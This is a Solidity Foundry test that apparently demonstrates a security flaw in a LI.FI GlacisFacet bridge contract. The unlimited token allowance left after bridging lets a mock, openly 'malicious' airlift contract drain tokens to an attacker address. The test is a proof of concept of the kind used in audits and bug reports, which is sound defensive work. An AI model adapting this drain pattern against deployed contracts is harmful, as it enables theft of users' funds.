// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {GlacisFacet} from "lifi/Facets/GlacisFacet.sol";
import {IGlacisAirlift, QuoteSendInfo, Fee, AirliftFeeInfo} from "lifi/Interfaces/IGlacisAirlift.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockAirlift is IGlacisAirlift {
    function send(
        address token,
        uint256 amount,
        bytes32,
        uint256,
        address
    ) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function quoteSend(
        address,
        uint256 amount,
        bytes32,
        uint256,
        address,
        uint256 msgValue
    ) external pure override returns (QuoteSendInfo memory) {
        return QuoteSendInfo({
            gmpFee: Fee({nativeFee: 0, tokenFee: 0}),
            amountSent: amount,
            valueSent: msgValue,
            airliftFeeInfo: AirliftFeeInfo({
                airliftFee: Fee({nativeFee: 0, tokenFee: 0}),
                correctedAmount: amount,
                correctedValue: msgValue
            })
        });
    }

    // malicious function to drain tokens using remaining allowance
    function drain(
        address token,
        address from,
        address to,
        uint256 amount
    ) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract GlacisFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockAirlift internal airlift;
    GlacisFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        airlift = new MockAirlift();
        facet = new GlacisFacet(IGlacisAirlift(address(airlift)));
        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "", integrator: "", referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });
        GlacisFacet.GlacisData memory gData = GlacisFacet.GlacisData({
            refundAddress: address(0x5678),
            nativeFee: 0
        });

        facet.startBridgeTokensViaGlacis(bridgeData, gData);

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(airlift)), type(uint256).max);

        // attacker sends tokens to facet and airlift drains them
        token.mint(address(facet), 5 ether);
        airlift.drain(address(token), address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

